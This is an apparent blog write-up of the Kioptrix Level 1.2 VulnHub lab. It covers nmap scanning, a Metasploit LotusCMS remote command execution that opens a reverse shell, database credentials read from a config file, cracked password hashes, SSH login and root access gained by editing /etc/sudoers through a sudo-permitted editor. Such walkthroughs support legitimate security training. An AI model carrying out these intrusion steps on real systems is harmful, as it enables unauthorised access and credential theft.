---
title: KIOPTRIX LEVEL 1.2 (#3)
date: 2021-07-21 11:13:00 +0200
categories: [VlunHub]
tags: [vulnhub, easy, php, phpmyadmin, ssh, ht, sudoers, kioptrix] 

---

# Introduction

This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.



# Scanning

We first need to get the target IP. 

`nmap -sP 192.168.1.0/24`

Target IP  is `192.168.1.7`

## nmap 

`sudo nmap -sV -p- -O -T4 192.168.1.7`

- `-sV` determine service/version info
- `-T4` for faster execution
- `-p-` scan all ports
- `-O` identify Operating System

```console
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 07:48 EDT
Nmap scan report for 192.168.1.7
Host is up (0.00095s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.2
OS details: Linux 3.2
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.73 seconds

```

lets take a look on port `80`

![image-20210721082002919](/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721082002919.png)

hit login tab

![image-20210721082028275](/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721082028275.png)

i tried to brute force credentials but no result 

close enough ...

![image-20210721082214088](/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721082214088.png)

lets check this CMS

```console
➜  ~ searchsploit lotuscms
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)          | php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                              | php/webapps/16982.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

lets try this 

​	`LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)`



 # Gaining Access

fire msfconsole

```console
msf6 > search lotuscms

Matching Modules
================

   #  Name                              Disclosure Date  Rank       Check  Description
   -  ----                              ---------------  ----       -----  -----------
   0  exploit/multi/http/lcms_php_exec  2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/lcms_php_exec

msf6 exploit(multi/http/lcms_php_exec) > show payloads 

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/generic/custom                                       normal  No     Custom Payload
   1   payload/generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
   2   payload/generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
   3   payload/multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   4   payload/multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
   5   payload/php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
   6   payload/php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
   7   payload/php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
   8   payload/php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
   9   payload/php/download_exec                                    normal  No     PHP Executable Download and Execute
   10  payload/php/exec                                             normal  No     PHP Execute Command
   11  payload/php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
   12  payload/php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
   13  payload/php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
   14  payload/php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
   15  payload/php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   16  payload/php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   17  payload/php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
   18  payload/php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)

msf6 exploit(multi/http/lcms_php_exec) > set 2
[-] Unknown variable
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf6 exploit(multi/http/lcms_php_exec) > set payload 2
payload => generic/shell_reverse_tcp
msf6 exploit(multi/http/lcms_php_exec) > options

Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.8      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf6 exploit(multi/http/lcms_php_exec) > set rhosts 192.168.1.7
rhosts => 192.168.1.7
msf6 exploit(multi/http/lcms_php_exec) > set uri /
uri => /
msf6 exploit(multi/http/lcms_php_exec) > run

[*] Started reverse TCP handler on 192.168.1.8:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Command shell session 1 opened (192.168.1.8:4444 -> 192.168.1.7:33294) at 2021-07-21 08:32:50 -0400

whoami
www-data
python -c 'import pty; pty.spawn("/bin/sh")'
$ 

```

- [x] Service Account Access

check config files

```console
$ find . -name "*config.php"
./gallery/gconfig.php
```

open this file

```console
cat ./gallery/gconfig.php
<?php
	error_reporting(0);
	/*
		A sample Gallarific configuration file. You should edit
		the installer details below and save this file as gconfig.php
		Do not modify anything else if you don't know what it is.
	*/

	// Installer Details -----------------------------------------------

	// Enter the full HTTP path to your Gallarific folder below,
	// such as http://www.yoursite.com/gallery
	// Do NOT include a trailing forward slash

	$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

	$GLOBALS["gallarific_mysql_server"] = "localhost";
	$GLOBALS["gallarific_mysql_database"] = "gallery";
	$GLOBALS["gallarific_mysql_username"] = "root";
	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";

	// Setting Details -------------------------------------------------

if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {
		echo("A connection to the database couldn't be established: " . mysql_error());
		die();
}else {
	if(!$g_mysql_d = @mysql_select_db($GLOBALS["gallarific_mysql_database"], $g_mysql_c)) {
		echo("The Gallarific database couldn't be opened: " . mysql_error());
		die();
	}else {
		$settings=mysql_query("select * from gallarific_settings");
		if(mysql_num_rows($settings)!=0){
			while($data=mysql_fetch_array($settings)){
				$GLOBALS["{$data['settings_name']}"]=$data['settings_value'];
			}
		}
	
	}
}

?>

```

Now we have username and password for **phpmyadmin** 

```console
	$GLOBALS["gallarific_mysql_username"] = "root";
	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```

lets check it ... `http://192.168.1.7/phpmyadmin/`

we IN <3

![image-20210721084439010](/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721084439010.png)

after check existing DB i find this 

![image-20210721084611434](/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721084611434.png)

![image-20210721084636459](/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721084636459.png)

open this table ...

![image-20210721084737831](/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721084737831.png)

Finding this ... **developer credentials**

but it hashed lets decrypt it using **hashes.com**

```console
0d3eccfb887aabd50f243b3f155c0f85:Mast3r
5badcaf789d3d1d09794d8f021f40f0e:starwars
```

|  Username  | Password |
| :--------: | :------: |
|    dreg    |  Mast3r  |
| loneferret | starwars |

step back we still have shell 

lets view `/etc/passwd`

```console
$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
```

`loneferret -> /bin/bash`

 loneferret had normal shell lets try to hit it using ssh

> note : we avoid using dreg because account shell is restricted "rbash"

```console
➜  ~ ssh loneferret@192.168.1.7
The authenticity of host '192.168.1.7 (192.168.1.7)' can't be established.
RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.7' (RSA) to the list of known hosts.

loneferret@192.168.1.7's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Wed Jul 21 08:25:04 2021 from 192.168.1.8
loneferret@Kioptrix3:~$ 

```

- [x] Regular User Account Access



# Privilege Escalation

at this point we can run `enu4linux` but wait ...

lets check user privilege

```console
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: /bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

check history

```console
loneferret@Kioptrix3:~$ history
    1  sudo ht
    2  exit
    3  history 
```

`sudo ht` looks juicy lets hit it ...

```console
loneferret@Kioptrix3:~$ sudo ht
Error opening terminal: xterm-256color.
loneferret@Kioptrix3:~$ export TERM=xterm
loneferret@Kioptrix3:~$ sudo ht
```

this Appear ...

![image-20210721090641998](/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721090641998.png)

its an IN-Terminal text editor like *nano, vim, ...*

we had `sudo` privilege with this app 

lets try  edit `/etc/sudoers`

`f3` to open file

![image-20210721091146032](/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721091146032.png)

hit `enter` now we need to add `/bin/su` privilege to current account 

![image-20210721091327400](/assets/2021-07-21-KIOPTRIX_LEVEL_1.2/image-20210721091327400.png)

`f2` save 

```console
loneferret@Kioptrix3:~$ sudo su
root@Kioptrix3:/home/loneferret# cd
root@Kioptrix3:~# ls
Congrats.txt  ht-2.0.18
root@Kioptrix3:~# cat Congrats.txt 
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.
...
```



- [x] Root User Account Access